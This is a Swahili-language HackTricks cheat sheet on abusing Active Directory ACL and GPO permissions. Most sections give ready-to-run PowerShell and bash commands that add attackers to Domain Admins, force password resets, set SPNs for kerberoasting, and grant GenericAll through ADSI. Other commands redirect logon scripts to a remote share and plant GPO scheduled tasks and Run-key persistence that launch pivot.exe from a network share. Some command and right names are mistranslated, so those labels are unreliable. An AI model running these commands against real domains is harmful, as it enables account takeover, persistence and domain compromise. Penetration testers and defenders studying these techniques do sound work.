# Kudhuru Mifumo ya Active Directory ACLs/ACEs

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pata udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Ukurasa huu kwa kiasi kikubwa ni muhtasari wa mbinu kutoka [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) na [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Kwa maelezo zaidi, angalia nakala asili.**


## **Haki za GenericAll kwenye Mtumiaji**
Haki hii inampa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji anayelengwa. Mara baada ya kuthibitisha haki za `GenericAll` kwa kutumia amri ya `Get-ObjectAcl`, mshambuliaji anaweza:

- **Kubadilisha Nenosiri la Lengo**: Kwa kutumia `net user <jina la mtumiaji> <nenosiri> /domain`, mshambuliaji anaweza kurejesha upya nenosiri la mtumiaji.
- **Kerberoasting Inayolengwa**: Weka SPN kwenye akaunti ya mtumiaji ili iweze kufanyiwa kerberoasting, kisha tumia Rubeus na targetedKerberoast.py kuchukua na kujaribu kuvunja funguo za tiketi ya kutoa ruhusa (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Kulenga ASREPRoasting**: Lemaza uthibitishaji kabla ya kuthibitisha kwa mtumiaji, kufanya akaunti yao kuwa hatarini kwa ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Haki za GenericAll kwenye Kikundi**
Haki hii inaruhusu mshambuliaji kubadilisha uanachama wa kikundi ikiwa ana haki za `GenericAll` kwenye kikundi kama `Domain Admins`. Baada ya kutambua jina la kipekee la kikundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:

- **Kujiweka kwenye Kikundi cha Domain Admins**: Hii inaweza kufanywa kupitia amri moja kwa moja au kwa kutumia moduli kama Active Directory au PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Andika kwenye Kompyuta/Mtumiaji**
Kumiliki mamlaka haya kwenye kifaa cha kompyuta au akaunti ya mtumiaji inaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Inawezesha kuchukua udhibiti wa kifaa cha kompyuta.
- **Shadow Credentials**: Tumia mbinu hii kuiga kifaa cha kompyuta au akaunti ya mtumiaji kwa kuchexploit mamlaka ya kuunda shadow credentials.

## **Andika Mali kwenye Kikundi**
Ikiwa mtumiaji ana haki za `Andika Mali` kwenye vitu vyote kwa kikundi maalum (kwa mfano, `Domain Admins`), wanaweza:

- **Kujiweka kwenye Kikundi cha Domain Admins**: Inawezekana kwa kuchanganya amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kuongeza mamlaka ndani ya kikoa.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Uanachama wa Mwenyewe) kwenye Kikundi**
Haki hii inawezesha wadukuzi kujiweka wenyewe kwenye vikundi maalum, kama vile `Domain Admins`, kupitia amri ambazo zinabadilisha uanachama wa kikundi moja kwa moja. Kutumia mfuatano wa amri zifuatazo inaruhusu kujiweka wenyewe:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Uanachama wa Kujisajili)**
Haki kama hii inaruhusu wadukuzi kujiweka wenyewe moja kwa moja kwenye makundi kwa kubadilisha mali za kundi ikiwa wana haki ya `WriteProperty` kwenye makundi hayo. Uthibitisho na utekelezaji wa haki hii unafanywa kwa kutumia:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Kushikilia `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` inaruhusu kurekebisha nywila bila kujua nywila ya sasa. Uhakiki wa haki hii na utumiaji wake unaweza kufanywa kupitia PowerShell au zana za amri mbadala, zinazotoa njia kadhaa za kurekebisha nywila ya mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na mistari moja kwa mazingira yasiyo ya mwingiliano. Amri hizo zinatofautiana kutoka kwa wito rahisi wa PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionyesha uwezo wa njia za mashambulizi.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **AndikaMmiliki kwenye Kikundi**
Ikiwa mshambuliaji anagundua kuwa ana haki za `AndikaMmiliki` juu ya kikundi, wanaweza kubadilisha umiliki wa kikundi kuwa wao wenyewe. Hii ina athari kubwa hasa wakati kikundi kinachohusika ni `Domain Admins`, kwani kubadilisha umiliki kunaruhusu udhibiti mpana juu ya sifa za kikundi na uanachama. Mchakato huu unahusisha kutambua kitu sahihi kupitia `Pata-KituAcl` na kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, kwa kutumia SID au jina.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite kwa Mtumiaji**
Ruhusa hii inamruhusu mshambuliaji kubadilisha mali za mtumiaji. Kwa usahihi, kwa kupata ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya hati ya kuingia ya mtumiaji ili kutekeleza hati ya kudhuru wakati mtumiaji anapoingia. Hii inafanikiwa kwa kutumia amri ya `Set-ADObject` kusasisha mali ya `scriptpath` ya mtumiaji lengwa ili ionyeshe hati ya mshambuliaji.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite kwenye Kikundi**
Kwa haki hii, wadukuzi wanaweza kubadilisha uanachama wa kikundi, kama vile kuongeza wao wenyewe au watumiaji wengine kwenye vikundi maalum. Mchakato huu unahusisha kuunda kitambulisho, kutumia kitambulisho hicho kuongeza au kuondoa watumiaji kutoka kikundi, na kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Umiliki kitu cha AD na kuwa na mamlaka ya `WriteDACL` kunawezesha mshambuliaji kujipatia mamlaka ya `GenericAll` juu ya kitu hicho. Hii inafanikishwa kupitia udanganyifu wa ADSI, kuruhusu udhibiti kamili juu ya kitu na uwezo wa kubadilisha uanachama wake wa kikundi. Licha ya hilo, kuna vikwazo vinavyojitokeza wakati wa kudukua mamlaka haya kwa kutumia moduli ya Active Directory's `Set-Acl` / `Get-Acl` cmdlets.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikesheni kwenye Kikoa (DCSync)**
Shambulio la DCSync linatumia ruhusa maalum za replikesheni kwenye kikoa ili kuiga Kudhibiti Kikoa na kusawazisha data, ikiwa ni pamoja na sifa za watumiaji. Tekniki hii yenye nguvu inahitaji ruhusa kama vile `DS-Replication-Get-Changes`, kuruhusu wadukuzi kuchukua habari nyeti kutoka kwenye mazingira ya AD bila kupata moja kwa moja kwenye Kudhibiti Kikoa.
[**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)







## Utekelezaji wa GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Utekelezaji wa GPO

Upatikanaji uliopewa ruhusa ya kusimamia Vitu vya Sera ya Kikundi (GPOs) unaweza kuwa na hatari kubwa ya usalama. Kwa mfano, ikiwa mtumiaji kama vile `offense\spotless` amepewa haki za usimamizi wa GPO, wanaweza kuwa na mamlaka kama vile **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumiwa vibaya kwa madhumuni mabaya, kama ilivyobainishwa kwa kutumia PowerView:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Kuchunguza Ruhusa za GPO

Kutambua GPOs zilizokosewa, amri za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu ugunduzi wa GPOs ambazo mtumiaji maalum ana ruhusa za kusimamia:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Kompyuta Zilizo na Sera Iliyotekelezwa Iliyopewa**: Inawezekana kutambua ni kompyuta zipi zinazotumia GPO fulani, kusaidia kuelewa wigo wa athari inayowezekana.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Sera Iliyotekelezwa kwenye Kompyuta Iliyopewa**: Ili kuona sera zipi zilizotekelezwa kwenye kompyuta fulani, amri kama vile `Get-DomainGPO` zinaweza kutumika.

**OU Zilizoathiriwa na Sera Iliyotekelezwa Iliyopewa**: Kutambua vitengo vya shirika (OUs) vilivyoathiriwa na sera iliyopewa inaweza kufanywa kwa kutumia `Get-DomainOU`.

### Matumizi Mabaya ya GPO - New-GPOImmediateTask

GPOs zilizokosewa zinaweza kutumiwa kutekeleza nambari, kwa mfano, kwa kuunda kazi ya ratiba ya moja kwa moja. Hii inaweza kufanywa ili kuongeza mtumiaji kwenye kikundi cha wasimamizi wa ndani kwenye mashine zilizoathiriwa, kuinua sana mamlaka:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Kikundi cha Moduli - Matumizi mabaya ya GPO

Kikundi cha Moduli, ikiwa imewekwa, inaruhusu uundaji na uunganishaji wa GPO mpya, na kuweka mapendeleo kama vile thamani za usajili ili kutekeleza milango ya nyuma kwenye kompyuta zilizoathiriwa. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta ili kutekelezwa:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Matumizi Mabaya ya GPO

SharpGPOAbuse inatoa njia ya kutumia vibaya GPO zilizopo kwa kuongeza kazi au kubadilisha mipangilio bila haja ya kuunda GPO mpya. Zana hii inahitaji kufanyia marekebisho GPO zilizopo au kutumia zana za RSAT kuunda GPO mpya kabla ya kufanya mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Kulazimisha Sasisho la Sera

Kawaida, sasisho za GPO hufanyika kila baada ya dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kuwa mabadiliko yoyote kwenye GPO yanatekelezwa bila kusubiri mzunguko wa sasisho la kiotomatiki ujao.

### Chini ya Kapu

Kwa kuchunguza Kazi Zilizopangwa kwa GPO fulani, kama vile `Misconfigured Policy`, kuongezwa kwa kazi kama vile `evilTask` kunaweza kuthibitishwa. Kazi hizi hujengwa kupitia hati au zana za mstari wa amri zinazolenga kubadilisha tabia ya mfumo au kuongeza mamlaka.

Muundo wa kazi, kama inavyoonyeshwa kwenye faili ya usanidi ya XML iliyozalishwa na `New-GPOImmediateTask`, unafafanua maelezo ya kazi iliyopangwa - ikiwa ni pamoja na amri itakayotekelezwa na vichocheo vyake. Faili hii inawakilisha jinsi kazi zilizopangwa zinavyofafanuliwa na kusimamiwa ndani ya GPO, ikitoa njia ya kutekeleza amri au hati za aina yoyote kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPO pia inaruhusu uhariri wa watumiaji na uanachama wa vikundi kwenye mifumo lengwa. Kwa kuhariri faili za sera za Watumiaji na Vikundi moja kwa moja, wadukuzi wanaweza kuongeza watumiaji kwenye vikundi vyenye mamlaka, kama vile kikundi cha `administrators` cha ndani. Hii inawezekana kupitia uteuzi wa ruhusa za usimamizi wa GPO, ambayo inaruhusu mabadiliko ya faili za sera ili kuongeza watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanidi ya XML kwa Watumiaji na Vikundi inaelezea jinsi mabadiliko haya yanatekelezwa. Kwa kuongeza vitu kwenye faili hii, watumiaji maalum wanaweza kupewa mamlaka ya juu kwenye mifumo iliyohusika. Njia hii inatoa njia moja kwa moja ya kuongeza mamlaka kupitia uhariri wa GPO.

Zaidi ya hayo, njia zaidi za kutekeleza nambari au kudumisha uthabiti, kama vile kutumia hati za kuingia/kutoka, kuhariri funguo za usajili kwa ajili ya kuanza moja kwa moja, kusakinisha programu kupitia faili za .msi, au kuhariri mipangilio ya huduma, pia zinaweza kuzingatiwa. Tekniki hizi zinatoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kupitia unyanyasaji wa GPO.

## Marejeo

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuyatatua haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitahidi, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
